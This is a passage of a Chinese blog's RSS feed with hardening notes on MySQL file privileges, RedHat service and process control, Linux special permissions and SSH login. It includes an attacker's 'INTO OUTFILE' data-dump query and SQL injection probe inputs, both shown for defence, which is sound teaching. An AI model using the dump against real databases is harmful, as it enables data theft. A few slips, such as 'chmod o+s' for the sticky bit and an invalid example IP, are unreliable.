<p>MySQL 权限系统的主要功能是证实连接到一台给定主机的用户, 并且赋予该用户在数据库上的 <code>SELECT</code> 、 <code>INSERT</code> 、 <code>UPDATE</code> 和 <code>DELETE</code> 等权限（详见 user 超级用户表）。它的附加的功能包括有匿名的用户并对于 MySQL 特定的功能例如 <code>load data local infile</code> 进行授权及管理操作的能力。</p>
<p>FILE 权限允许用户在 MySQL 服务器具有写权限的目录下创建新文件, 但不能覆盖已有文件在 user 表的 <code>File_priv</code> 设置 <code>Y</code> 或 <code>N</code> 。, 所以当你不需要对服务器文件读取时, 请关闭该权限。</p>
<h3 id="加固-4" tabindex="-1"> 加固</h3>
<div><p>提示</p>
<p>需要将之前的加固配置项（ <code>local-infile=0</code> ）清掉</p>
</div>
<div><pre><code>mysql<span>></span> <span>update</span> mysql<span>.</span><span>user</span> <span>set</span> file_priv<span>=</span><span>'N'</span> <span>where</span> <span>user</span><span>=</span><span>'root'</span><span>;</span>
mysql<span>></span> flush <span>privileges</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/mysql-reinforce-23.png" alt="MySQL 数据库加固"></p>
<br>
<p><img src="/assets/mysql-reinforce-24.png" alt="MySQL 数据库加固"></p>
<div><p>注意</p>
<p>刷新授权表之后, 一定要重新登录再进行测试, 否则还是会执行成功的</p>
</div>
<p>当 <code>file_priv='N'</code> , 黑客进行以下语句的时候, 就会出错</p>
<div><pre><code>mysql<span>></span> <span>select</span> <span>*</span> <span>from</span> test<span>.</span>passwd <span>into</span> <span>outfile</span> <span>'test.txt'</span> <span>fields</span> <span>terminated</span> <span>by</span> <span>':'</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>当然还原配置之后, 黑客就可以很愉快的获取数据库中内容</p>
<p><img src="/assets/mysql-reinforce-25.png" alt="MySQL 数据库加固"></p>
<br>
<p><img src="/assets/mysql-reinforce-26.png" alt="MySQL 数据库加固"></p>
<h2 id="使用-chroot-来控制-mysql-的运行目录" tabindex="-1"> 使用 chroot 来控制 MySQL 的运行目录</h2>
<p><code>Chroot</code> 是 linux 中的一种系统高级保护手段, 它的建立会将其与主系统几乎完全隔离, 也就是说, 一旦遭到什么问题, 也不会危及到正在运行的主系统。这是一个非常有效的办法, 特别是在配置网络服务程序的时候。</p>
<h2 id="关闭对-web-访问的支持" tabindex="-1"> 关闭对 Web 访问的支持</h2>
<p>如果不打算让 Web 访问使用 MySQL 数据库, 没有提供诸如 PHP 这样的 Web 语言的时候, 重新设置或编译你的 PHP, 取消它们对 MySQL 的默认支持。假如服务器中使用 PHP 等 web 程序, 试试用 Web 形式非法的请求, 如果得到任何形式的 MySQL 错误, 立即分析原因, 及时修改 Web 程序, 堵住漏洞, 防止 MySQL 暴露在 web 面前。 对于 Web 的安全检查, 在 MySQL 官方文档中这么建议, 对于 web 应用, 至少检查以下清单:</p>
<ul>
<li>试试用 Web 形式输入单引号和双引号( <code>‘’’</code> 和 <code>‘”’</code> )。如果得到任何形式的 MySQL 错误, 立即分析原因。</li>
<li>试试修改动态 URL, 可以在其中添加 <code>%22(‘”’)</code> 、 <code>%23(‘#’)</code> 和 <code>%27(‘’’)</code> 。</li>
<li>试试在动态 URL 中修改数据类型, 使用前面示例中的字符, 包括数字和字符类型。你的应用程序应足够安全, 可以防范此类修改和类似攻击。</li>
<li>试试输入字符、空格和特殊符号, 不要输入数值字段的数字。你的应用程序应在将它们传递到 MySQL 之前将它们删除或生成错误。将未经过检查的值传递给 MySQL 是很危险的！</li>
<li>将数据传给 MySQL 之前先检查其大小。</li>
<li>用管理账户之外的用户名将应用程序连接到数据库。不要给应用程序任何不需要的访问权限。</li>
</ul>
<h2 id="数据库备份策略" tabindex="-1"> 数据库备份策略</h2>
<p>使用 <code>mysqldump</code> 可以把整个数据库装载到一个单独的文本文件中。这个文件包含有所有重建您的数据库所需要的 SQL 命令。</p>
<div><pre><code>mysqldump -u root -p mysql <span>></span> abc.sql
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="mysqld-安全相关启动项" tabindex="-1"> mysqld 安全相关启动项</h2>
<p>下列 <code>mysqld</code> 选项影响安全:</p>
<ul>
<li><strong><code>--allow-suspicious-udfs</code></strong></li>
</ul>
<p>-- 该选项控制是否可以载入主函数只有 xxx 符的用户定义函数。默认情况下, 该选项被关闭, 并且只能载入至少有辅助符的 UDF。这样可以防止从未包含合法 UDF 的共享对象文件载入函数。</p>
<ul>
<li><strong><code>--local-infile[={0|1}]</code></strong></li>
</ul>
<p>-- 如果用 <code>–local-infile=0</code> 启动服务器, 则客户端不能使用 LOCAL in LOAD DATA 语句。</p>
<ul>
<li><strong><code>--old-passwords</code></strong></li>
</ul>
<p>-- 强制服务器为新密码生成短( <code>pre-4.1</code> )密码哈希。当服务器必须支持旧版本客户端程序时, 为了保证兼容性这很有用。</p>
<ul>
<li><strong><code>(OBSOLETE) --safe-show-database</code></strong></li>
</ul>
<p>-- 在以前版本的 MySQL 中, 该选项使 <code>SHOW DATABASES</code> 语句只显示用户具有部分权限的数据库名。在 <code>MySQL 5.1</code> 中, 该选项不再作为现在的 默认行为使用, 有一个 <code>SHOW DATABASES</code> 权限可以用来控制每个账户对数据库名的访问。</p>
<ul>
<li><strong><code>--safe-user-create</code></strong></li>
</ul>
<p>-- 如果启用, 用户不能用 <code>GRANT</code> 语句创建新用户, 除非用户有 <code>mysql.user</code> 表的 <code>INSERT</code> 权限。如果你想让用户具有授权权限来创建新用户, 你应给用户授予下面的权限: <code>mysql&gt; GRANT INSERT(user) ON mysql.user TO ‘user_name’@'host_name’;</code> 这样确保用户不能直接更改权限列, 必须使用 GRANT 语句给其它用户授予该权限。</p>
<ul>
<li><strong><code>--secure-auth</code></strong></li>
</ul>
<p>-- 不允许鉴定有旧( <code>pre-4.1</code> )密码的账户。</p>
<ul>
<li><strong><code>--skip-grant-tables</code></strong></li>
</ul>
<p>-- 这个选项导致服务器根本不使用权限系统。这给每个人以完全访问所有的数据库的权力！（通过执行 <code>mysqladmin flush-privileges</code> 或 <code>mysqladmin eload</code> 命令, 或执行 <code>FLUSH PRIVILEGES</code> 语句, 你能告诉一个正在运行的服务器再次开始使用授权表。）</p>
<ul>
<li><strong><code>--skip-name-resolve</code></strong></li>
</ul>
<p>-- 主机名不被解析。所有在授权表的 Host 的列值必须是 IP 号或 localhost。</p>
<ul>
<li><strong><code>--skip-networking</code></strong></li>
</ul>
<p>-- 在网络上不允许 TCP/IP 连接。所有到 mysqld 的连接必须经由 Unix 套接字进行。</p>
<ul>
<li><strong><code>--skip-show-database</code></strong></li>
</ul>
<p>-- 使用该选项, 只允许有 <code>SHOW DATABASES</code> 权限的用户执行 <code>SHOW DATABASES</code> 语句, 该语句显示所有数据库名。不使用该选项, 允许所有用户执行 <code>SHOW DATABASES</code> , 但只显示用户有 <code>SHOW DATABASES</code> 权限或部分数据库权限的数据库名。请注意全局权限指数据库的权限。</p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/mysql-reinforce-1.png" type="image/png"/>
    </item>
    <item>
      <title>RedHat 系统安全加固（四）服务和进程管理</title>
      <link>https://vxhly.github.io/views/liunx/service-and-process-management.html</link>
      <guid>https://vxhly.github.io/views/liunx/service-and-process-management.html</guid>
      <source url="https://vxhly.github.io/rss.xml">RedHat 系统安全加固（四）服务和进程管理</source>
      <description>前言
本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统服务和进程的查看与关闭, 通俗的来说进程是运行起来的程序。唯一标示进程的是进程描述符（PID）, 在 linux 内核中是通过 task_struck 和 task_list 来定义和管理进程的。

</description>
      <category>liunx</category>
      <pubDate>Wed, 19 Oct 2016 11:01:04 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统服务和进程的查看与关闭, 通俗的来说进程是运行起来的程序。唯一标示进程的是进程描述符（PID）, 在 linux 内核中是通过 task_struck 和 task_list 来定义和管理进程的。</p>
</div>

<h2 id="ps-查看系统进程" tabindex="-1"> ps 查看系统进程</h2>
<div><p>命令作用</p>
<p><code>ps</code> 命令用于报告当前系统的进程状态。可以搭配 <code>kill</code> 指令随时中断、删除不必要的程序。 <code>ps</code> 命令是最基本同时也是非常强大的进程查看命令, 使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等, 总之大部分信息都是可以通过执行该命令得到的。</p>
</div>
<h3 id="相关选项" tabindex="-1"> 相关选项</h3>
<ul>
<li><strong>-a</strong> -------------------- 显示所有终端机下执行的程序, 除了阶段作业领导者之外</li>
<li><strong>a</strong> -------------------- 显示现行终端机下的所有程序, 包括其他用户的程序</li>
<li><strong>-A</strong> -------------------- 显示所有程序</li>
<li><strong>-u&lt;用户识别码&gt;</strong> -------------------- 此选项的效果和指定 <code>&quot;-U&quot;</code> 选项相同</li>
<li><strong>u</strong> -------------------- 以用户为主的格式来显示程序状况</li>
<li><strong>-U&lt;用户识别码&gt;</strong> -------------------- 列出属于该用户的程序的状况, 也可使用用户名称来指定</li>
<li><strong>U&lt;用户名称&gt;</strong> -------------------- 列出属于该用户的程序的状况</li>
<li><strong>-e</strong> -------------------- 此选项的效果和指定 <code>&quot;A&quot;</code> 选项相同</li>
<li><strong>e</strong> -------------------- 列出程序时, 显示每个程序所使用的环境变量</li>
<li><strong>-f</strong> -------------------- 显示 UID, PPIP, C 与 STIME 栏位</li>
<li><strong>f</strong> -------------------- 用 ASCII 字符显示树状结构, 表达程序间的相互关系</li>
</ul>
<h3 id="示例" tabindex="-1"> 示例</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>ps</span> aux <span>|</span> <span>grep</span> <span>ssh</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/process-1.png" alt="RedHat 安全加固"></p>
<h2 id="netstat-查看网络情况" tabindex="-1"> netstat 查看网络情况</h2>
<p>netstat 命令用来打印 Linux 中网络系统的状态信息, 可让你得知整个 Linux 系统的网络情况。</p>
<h3 id="相关选项-1" tabindex="-1"> 相关选项</h3>
<ul>
<li><strong>-t 或 --tcp</strong> -------------------- 显示 TCP 传输协议的连线状况</li>
<li><strong>-u 或 --udp</strong> -------------------- 显示 UDP 传输协议的连线状况</li>
<li><strong>-n 或 --numeric</strong> -------------------- 直接使用 ip 地址, 而不通过域名服务器</li>
<li><strong>-p 或 --programs</strong> -------------------- 显示正在使用 Socket 的程序识别码和程序名称</li>
<li><strong>-l 或 --listening</strong> -------------------- 显示监控中的服务器的 Socket</li>
</ul>
<h3 id="示例-1" tabindex="-1"> 示例</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>netstat</span> -tulnp
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/process-2.png" alt="RedHat 安全加固"></p>
<h2 id="chkconfig-查看系统服务" tabindex="-1"> chkconfig 查看系统服务</h2>
<div><p>命令作用</p>
<p>chkconfig 命令检查、设置系统的各种服务。这是 Red Hat 公司遵循 GPL 规则所开发的程序, 它可查询操作系统在每一个执行等级中会执行哪些系统服务, 其中包括各类常驻服务。谨记 chkconfig 不是立即自动禁止或激活一个服务, 它只是简单的改变了符号连接。</p>
</div>
<h3 id="选项解释" tabindex="-1"> 选项解释</h3>
<ul>
<li><strong>--add</strong> -------------------- 增加所指定的系统服务, 让 <code>chkconfig</code> 指令得以管理它, 并同时在系统启动的叙述文件内增加相关数据；</li>
<li><strong>--del</strong> -------------------- 删除所指定的系统服务, 不再由 <code>chkconfig</code> 指令管理, 并同时在系统启动的叙述文件内删除相关数据；</li>
<li><strong>--level&lt;等级代号&gt;</strong> -------------------- 指定读系统服务要在哪一个执行等级中开启或关毕。</li>
</ul>
<p>-- 等级 <code>0</code> 表示 -------------------- 表示关机 -- 等级 <code>1</code> 表示 -------------------- 单用户模式 -- 等级 <code>2</code> 表示 -------------------- 无网络连接的多用户命令行模式 -- 等级 <code>3</code> 表示 -------------------- 有网络连接的多用户命令行模式 -- 等级 <code>4</code> 表示 -------------------- 不可用 -- 等级 <code>5</code> 表示 -------------------- 带图形界面的多用户模式 -- 等级 <code>6</code> 表示 -------------------- 重新启动</p>
<ul>
<li><strong>--list</strong> -------------------- 列出系统服务列表</li>
</ul>
<h3 id="示例-2" tabindex="-1"> 示例</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>chkconfig</span> --list
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/process-3.png" alt="RedHat 安全加固"></p>
<h2 id="关闭进程或服务" tabindex="-1"> 关闭进程或服务</h2>
<h3 id="kill-杀死进程" tabindex="-1"> kill 杀死进程</h3>
<div><p>命令作用</p>
<p>kill 命令用来删除执行中的程序或工作。kill 可将指定的信息送至程序。预设的信息为 SIGTERM(15), 可将指定程序终止。若仍无法终止该程序, 可使用 SIGKILL(9) 信息尝试强制删除程序。程序或工作的编号可利用 ps 指令或 job 指令查看。</p>
</div>
<h4 id="选项解释-1" tabindex="-1"> 选项解释</h4>
<ul>
<li><strong>-a</strong>-------------------- 当处理当前进程时, 不限制命令名和进程号的对应关系；</li>
<li><strong>-l &lt;信息编号&gt;</strong>-------------------- 若不加 <code>&lt;信息编号&gt;</code> 选项, 则 <code>-l</code> 参数会列出全部的信息名称；</li>
<li><strong>p</strong>-------------------- 指定 kill 命令只打印相关进程的进程号, 而不发送任何信号；</li>
<li><strong>-s &lt;信息名称或编号&gt;</strong>-------------------- 指定要送出的信息；</li>
<li><strong>-u</strong>-------------------- 指定用户。 参数</li>
</ul>
<p>只有第 9 种信号( <code>SIGKILL</code> )才可以无条件终止进程, 其他信号进程都有权利忽略, 下面是常用的信号--------------------</p>
<ul>
<li><strong>HUP</strong> 1 终端断线</li>
<li><strong>INT</strong> 2 中断（同 <code>Ctrl + C</code> ）</li>
<li><strong>QUIT</strong> 3 退出（同 <code>Ctrl + \</code> ）</li>
<li><strong>TERM</strong> 15 终止</li>
<li><strong>KILL</strong> 9 强制终止</li>
<li><strong>CONT</strong> 18 继续（与 <code>STOP</code> 相反, <code>fg/bg</code> 命令）</li>
<li><strong>STOP</strong> 19 暂停（同 <code>Ctrl + Z</code> ）</li>
</ul>
<h4 id="示例-3" tabindex="-1"> 示例</h4>
<p>用 ps 查找进程, 然后用 kill 杀掉, <code>For Examlpe:</code></p>
<div><pre><code><span>ps</span> -ef <span>|</span> <span>grep</span> <span>ssh</span>
<span>kill</span> <span>4456</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>用 netstat 查找进程, 然后用 kill 杀掉, <code>For Examlpe:</code></p>
<div><pre><code><span>netstat</span> -tulnp <span>|</span> <span>grep</span> <span>ssh</span>
<span>kill</span> <span>4456</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/process-4.png" alt="RedHat 安全加固"></p>
<h3 id="service-关闭服务" tabindex="-1"> service 关闭服务</h3>
<div><p>命令作用</p>
<p>service 命令是 Redhat Linux 兼容的发行版中用来控制系统服务的实用工具, 它以启动、停止、重新启动和关闭系统服务, 还可以显示所有系统服务的当前状态。</p>
</div>
<h4 id="选项信息" tabindex="-1"> 选项信息</h4>
<ul>
<li><strong>-h</strong>-------------------- 显示帮助信息；</li>
<li><strong>--status-all</strong>-------------------- 显示所服务的状态。</li>
</ul>
<h4 id="示例-4" tabindex="-1"> 示例</h4>
<p><code>For Examlpe:</code></p>
<div><pre><code><span>service</span> mysqld status
<span>service</span> mysqld stop
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/process-5.png" alt="RedHat 安全加固"></p>
<p>那么要是系统没有 <code>service</code> 命令, 怎么办呢? Liunx 系统下是所有的服务名是存放在 <code>/etc/init.d/</code> 下的, 所以也可以使用以下命令来停止服务, <code>For Examlpe:</code></p>
<div><pre><code>/etc/init.d/named status
/etc/init.d/named stop
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/process-6.png" alt="RedHat 安全加固"></p>
<h3 id="chkconfig-删除服务" tabindex="-1"> chkconfig 删除服务</h3>
<h4 id="示例-5" tabindex="-1"> 示例</h4>
<p><code>For Examlpe:</code></p>
<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> <span>sendmail</span>
<span>chkconfig</span> --del <span>sendmail</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/process-7.png" alt="RedHat 安全加固"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/process-1.png" type="image/png"/>
    </item>
    <item>
      <title>Liunx 学习笔记（七）文件的特殊权限</title>
      <link>https://vxhly.github.io/views/liunx/special-permissions-for-files.html</link>
      <guid>https://vxhly.github.io/views/liunx/special-permissions-for-files.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 学习笔记（七）文件的特殊权限</source>
      <description>前言
本篇是 Liunx 的学习笔记系列第七篇, 在 Liunx 中文件除了 rwx 权限, 还存在 SetUID 、 SetGID 、 Sicky BIT 特殊权限, 本篇就是来介绍这些特殊权限。

</description>
      <category>liunx</category>
      <pubDate>Fri, 14 Oct 2016 19:25:27 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本篇是 Liunx 的学习笔记系列第七篇, 在 Liunx 中文件除了 rwx 权限, 还存在 SetUID 、 SetGID 、 Sicky BIT 特殊权限, 本篇就是来介绍这些特殊权限。</p>
</div>

<h2 id="setuid" tabindex="-1"> SetUID</h2>
<h3 id="针对文件的作用" tabindex="-1"> 针对文件的作用</h3>
<ul>
<li>只有可以执行的二进制程序才能设定 SUID 权限</li>
<li>命令执行者要对该程序用于 x（执行）权限</li>
<li>命令执行者在执行该程序是获得该程序文件属主的身份（在执行程序的过程中灵魂附体成文件的属主）</li>
<li>SetUID 权限只在该程序执行过程中有效, 也就是说身份改变只在程序执行过程中有效</li>
</ul>
<h3 id="概念图" tabindex="-1"> 概念图</h3>
<p><img src="/assets/setuid-1.png" alt="SetUID"></p>
<h3 id="设置-suid" tabindex="-1"> 设置 SUID</h3>
<p>只能针对二进制可执行文件</p>
<h4 id="_4-代表-suid" tabindex="-1"> 4 代表 SUID</h4>
<p><code>Command Format:</code></p>
<div><pre><code><span>chmod</span> <span>4777</span> <span>[</span>fileName<span>]</span>     <span># 设置 SUID 权限</span>
<span>chmod</span> <span>644</span> <span>[</span>fileName<span>]</span>      <span># 取消 SUID 权限</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>当然还可以用以下命令设置, <code>Command Format:</code></p>
<div><pre><code><span>chmod</span> u+s <span>[</span>fileName<span>]</span>      <span># 设置 SUID 权限</span>
<span>chmod</span> u-s <span>[</span>fileName<span>]</span>      <span># 取消 SUID 权限</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h4 id="s-与-s-的区别" tabindex="-1"> S 与 s 的区别</h4>
<div><p>提示</p>
<p>区别大写 <code>S</code> 其实是报错, 因为我们用来测试的文件并非二进制文件, 或者说是可执行程序, 只需添加 x 权限即可变为小写 <code>s</code> , 实际上生效的是小写 <code>s</code></p>
</div>
<p><code>For Examlpe:</code> <br></p>
<p><img src="/assets/setuid-2.png" alt="SetUID"></p>
<h3 id="危险的-setuid" tabindex="-1"> 危险的 SetUID</h3>
<ul>
<li>关键目录应严格控制写权限。比如 <code>“/”</code> 、 <code>”/usr“</code> 等</li>
<li>用户的密码设置要严格遵守密码三原则</li>
<li>对系统中默认应该具有 SetUID 权限的文件作一列表, 定时检查没有这个之外的文件是否被设置了 SetUID 权限</li>
</ul>
<h2 id="setgid" tabindex="-1"> SetGID</h2>
<p>既可以针对二进制可执行文件, 也可以针对目录</p>
<h3 id="针对文件的作用-1" tabindex="-1"> 针对文件的作用</h3>
<ul>
<li>只有可以执行的二进制程序才能设定 SGID 权限</li>
<li>命令执行者要对该程序用于 x（执行）权限</li>
<li>命令执行者在执行该程序的时候, 组身份升级为该程序的属组</li>
<li>SetUID 权限同样只在该程序执行过程中有效, 也就是说组身份改变只在程序执行过成中有效</li>
</ul>
<h3 id="针对目录的作用" tabindex="-1"> 针对目录的作用</h3>
<ul>
<li>普通用户必须对此目录拥有 r 和 x 权限, 才能进入此目录</li>
<li>普通用户在此目录中的有效组会变成此目录的属组</li>
<li>若普通用户对此目录拥有 w 权限时, 新建的文件的默认属组是这个目录的属组</li>
</ul>
<h3 id="设置-sgid" tabindex="-1"> 设置 SGID</h3>
<h4 id="_2-代表-sgid" tabindex="-1"> 2 代表 SGID</h4>
<p><code>Command Format:</code></p>
<div><pre><code><span>chmod</span> <span>2777</span> <span>[</span>fileName<span>]</span>      <span># 设置 SGID 权限</span>
<span>chmod</span> <span>644</span> <span>[</span>fileName<span>]</span>       <span># 取消 SGID 权限</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>当然还可以用以下命令设置, <code>Command Format:</code></p>
<div><pre><code><span>chmod</span> g+s <span>[</span>fileName<span>]</span>       <span># 设置 SGID 权限</span>
<span>chmod</span> g-s <span>[</span>fileName<span>]</span>      <span># 取消 SGID 权限</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h4 id="s-与-s-的区别-1" tabindex="-1"> S 与 s 的区别</h4>
<div><p>提示</p>
<p>区别大写 S 其实是报错, 因为我们用来测试的文件并非二进制文件, 或者说是可执行程序, 只需添加 x 权限即可变为小写 s</p>
</div>
<p><code>For Examlpe:</code> <br></p>
<p><img src="/assets/setgid.png" alt="SetUID"></p>
<h2 id="sicky-bit" tabindex="-1"> Sicky BIT</h2>
<p>只能针对目录</p>
<h3 id="针对目录的作用-1" tabindex="-1"> 针对目录的作用</h3>
<h3 id="设置-sbit" tabindex="-1"> 设置 SBIT</h3>
<ul>
<li>粘着位目前对目录有效</li>
<li>普通用户对该目录拥有 w 和 x 权限, 即普通用户可以在此目录拥有写入权限</li>
<li>如果没有粘着位, 因为普通用户拥有 w 权限, 所以可以删除此目录下所有文件, 包括其他用户建立的文件。一但赋予粘着位, 除了 root 可以删除所有文件, 普通用户就算拥有 w 权限, 也只能删除自己建立的文件, 但是不能删除其他用户建立的文件</li>
</ul>
<h4 id="_1-代表-sbit" tabindex="-1"> 1 代表 SBIT</h4>
<p><code>Command Format:</code></p>
<div><pre><code><span>chmod</span> <span>1777</span> <span>[</span>folderName<span>]</span>       <span># 设置 SBIT 权限</span>
<span>chmod</span> <span>644</span> <span>[</span>folderName<span>]</span>        <span># 取消 SBIT 权限</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>当然还可以用以下命令设置, <code>Command Format:</code></p>
<div><pre><code><span>chmod</span> o+s <span>[</span>folderName<span>]</span>       <span># 设置 SBIT 权限</span>
<span>chmod</span> o-t <span>[</span>folderName<span>]</span>       <span># 取消 SBIT 权限</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h4 id="举例" tabindex="-1"> 举例</h4>
<p><code>For Examlpe:</code> <br></p>
<p><img src="/assets/sticky-bit.png" alt="SetUID"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/setuid-1.png" type="image/png"/>
    </item>
    <item>
      <title>浅谈 SSH 服务</title>
      <link>https://vxhly.github.io/views/liunx/talk-ssh-service.html</link>
      <guid>https://vxhly.github.io/views/liunx/talk-ssh-service.html</guid>
      <source url="https://vxhly.github.io/rss.xml">浅谈 SSH 服务</source>
      <description>前言
SSH 是每一台 Linux 系统的标准配置服务, 本文将总结 SSH 的常见用法。

</description>
      <category>liunx</category>
      <pubDate>Tue, 15 Aug 2017 21:42:25 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>SSH 是每一台 Linux 系统的标准配置服务, 本文将总结 SSH 的常见用法。</p>
</div>

<h2 id="什么是-ssh" tabindex="-1"> 什么是 SSH</h2>
<p>SSH 为 <code>Secure Shell</code> 的缩写, 中文名字为安全外壳协议。SSH 是目前较可靠, 专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。需要指出的是, SSH 只是一种协议, 存在多种实现, 既有商业实现, 也有开源实现。</p>
<h1 id="基本用法" tabindex="-1"> 基本用法</h1>
<p>SSH 主要用于远程登录, 只要一条简单命令就可以了。</p>
<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>如果本地用户名与远程用户名一致, 登录时可以省略用户名。</p>
<div><pre><code><span>ssh</span> <span>[</span>hostIP<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>SSH 的默认端口是 22, 当然也可以使用 <code>-p</code> 修改这个端口。</p>
<div><pre><code><span>ssh</span> -p <span>[</span>port<span>]</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="中间人攻击" tabindex="-1"> 中间人攻击</h2>
<p>SSH 之所以能够保证安全, 原因在于它采用了公钥加密。</p>
<p>整个过程是这样的:</p>
<ul>
<li>远程主机收到用户的登录请求, 把自己的公钥发给用户。</li>
<li>用户使用这个公钥, 将登录密码加密后, 发送回来。</li>
<li>远程主机用自己的私钥, 解密登录密码, 如果密码正确, 就同意用户登录。</li>
</ul>
<p>这个过程本身是安全的, 但是实施的时候存在一个风险: 如果有人截获了登录请求, 然后冒充远程主机, 将伪造的公钥发给用户, 那么用户很难辨别真伪。因为不像 https 协议, SSH 协议的公钥是没有证书中心（CA）公证的, 也就是说, 都是自己签发的。</p>
<p>可以设想, 如果攻击者插在用户与远程主机之间（比如在公共的 wifi 区域）, 用伪造的公钥, 获取用户的登录密码。再用这个密码登录远程主机, 那么 SSH 的安全机制就荡然无存了。</p>
<p>这种风险就是著名的<a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack" target="_blank" rel="noopener noreferrer">&quot;中间人攻击&quot;</a>（Man-in-the-middle attack）。</p>
<h2 id="口令登录" tabindex="-1"> 口令登录</h2>
<p>如果你是第一次登录对方主机, 系统会出现下面的提示:</p>
<div><p>提示</p>
<p>The authenticity of host 'host (12.18.429.21)' can't be established.<br> RSA key fingerprint is 98:2e:d7:e0🇩🇪9f:ac:67:28:c2:42:2d:37:16:58:4d.<br> Are you sure you want to continue connecting (yes/no)?</p>
</div>
<p>这段话的意思是, 无法确认 host 主机的真实性, 只知道它的公钥指纹, 问你还想继续连接吗?</p>
<p>所谓&quot;公钥指纹&quot;, 是指公钥长度较长（这里采用 RSA 算法, 长达 1024 位）, 很难比对, 所以对其进行 MD5 计算, 将它变成一个 128 位的指纹。上例中是 <code>98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d</code> , 再进行比较, 就容易多了。</p>
<p>很自然的一个问题就是, 用户怎么知道远程主机的公钥指纹应该是多少? 回答是没有好办法, 远程主机必须在自己的网站上贴出公钥指纹, 以便用户自行核对。</p>
<p>假定经过风险衡量以后, 用户决定接受这个远程主机的公钥。</p>
<div><p>提示</p>
<p>Are you sure you want to continue connecting (yes/no)? yes</p>
</div>
<p>系统会出现一句提示, 表示 host 主机已经得到认可。</p>
<div><p>提示</p>
<p>Warning: Permanently added 'host, 12.18.429.21' (RSA) to the list of known hosts.</p>
</div>
<p>然后, 会要求输入密码。</p>
<div><p>提示</p>
<p>Password: (enter password)</p>
</div>
<p>如果密码正确, 就可以登录了。</p>
<p>当远程主机的公钥被接受以后, 它就会被保存在文件 <code>$HOME/.ssh/known_hosts</code> 之中。下次再连接这台主机, 系统就会认出它的公钥已经保存在本地了, 从而跳过警告部分, 直接提示输入密码。</p>
<p>每个 SSH 用户都有自己的 <code>known_hosts</code> 文件, 此外系统也有一个这样的文件, 通常是 <code>/etc/ssh/ssh_known_hosts</code> , 保存一些对所有用户都可信赖的远程主机的公钥。</p>
<h2 id="公钥登录" tabindex="-1"> 公钥登录</h2>
<p>使用密码登录, 每次都必须输入密码, 非常麻烦。好在 SSH 还提供了公钥登录, 可以省去输入密码的步骤。</p>
<p>所谓&quot;公钥登录&quot;, 原理很简单, 就是用户将自己的公钥储存在远程主机上。登录的时候, 远程主机会向用户发送一段随机字符串, 用户用自己的私钥加 密后, 再发回来。远程主机用事先储存的公钥进行解密, 如果成功, 就证明用户是可信的, 直接允许登录 shell, 不再要求密码。</p>
<p>这种方法要求用户必须提供自己的公钥。如果没有现成的, 可以直接用 ssh-keygen 生成一个:</p>
<div><pre><code>ssh-keygen
</code></pre><div aria-hidden="true"><div></div></div></div><p>运行上面的命令以后, 系统会出现一系列提示, 可以一路回车。其中有一个问题是, 要不要对私钥设置口令（passphrase）, 如果担心私钥的安全, 这里可以设置一个。</p>
<p>运行结束以后, 在 <code>$HOME/.ssh/</code> 目录下, 会新生成两个文件: <code>id_rsa.pub</code> 和 <code>id_rsa</code> 。前者是你的公钥, 后者是你的私钥。</p>
<p>这时再输入下面的命令, 将公钥传送到远程主机 host 上面:</p>
<div><pre><code>ssh-copy-id <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>好了, 从此你再登录, 就不需要输入密码了。</p>
<h2 id="authorized-keys-文件" tabindex="-1"> authorized_keys 文件</h2>
<p>远程主机将用户的公钥, 保存在登录后的用户主目录的 <code>$HOME/.ssh/authorized_keys</code> 文件中。公钥就是一段字符串, 只要把它追加在 authorized_keys 文件的末尾就行了。</p>
<p>这里不使用上面的 <code>ssh-copy-id</code> 命令, 改用下面的命令, 解释公钥的保存过程:</p>
